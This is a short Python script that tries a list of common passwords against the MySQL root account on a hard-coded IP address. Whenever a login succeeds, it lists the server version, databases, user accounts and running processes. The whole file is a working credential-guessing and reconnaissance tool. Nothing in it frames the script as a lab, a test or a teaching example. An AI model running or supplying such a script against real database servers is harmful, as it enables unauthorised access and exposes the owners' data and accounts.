import pymysql, time, sys

HOST = "203.0.113.105"
PORT = 3306
COMMON = ["", "root", "123456", "password", "mysql", "root123", "admin", "Aa123456", "P@ssw0rd", "12345678"]

def show(conn, title, sql):
    try:
        cur = conn.cursor()
        cur.execute(sql)
        rows = cur.fetchall()
        print(f"  [{title}] {len(rows)} rows")
        for r in rows[:25]:
            print("   ", r)
    except Exception as e:
        print(f"  [{title}] ERR {e}")

for pw in COMMON:
    label = pw if pw else "<empty>"
    try:
        conn = pymysql.connect(host=HOST, port=PORT, user="root", password=pw,
                               connect_timeout=8, read_timeout=12)
        print(f"[HIT] root / {label}  -> LOGIN SUCCESS (MySQL)")
        show(conn, "version", "SELECT VERSION(), CURRENT_USER(), @@hostname, @@datadir")
        show(conn, "databases", "SHOW DATABASES")
        show(conn, "users", "SELECT user, host, plugin FROM mysql.user")
        show(conn, "processlist", "SHOW PROCESSLIST")
        conn.close()
        sys.exit(0)
    except pymysql.err.OperationalError as e:
        code = e.args[0] if e.args else "?"
        msg = str(e.args[1])[:110] if len(e.args) > 1 else str(e)[:110]
        print(f"[--] root / {label:12s} -> {code} {msg}")
    except Exception as e:
        print(f"[--] root / {label:12s} -> {type(e).__name__} {str(e)[:110]}")
    time.sleep(1.5)

print("[done] no common password worked")
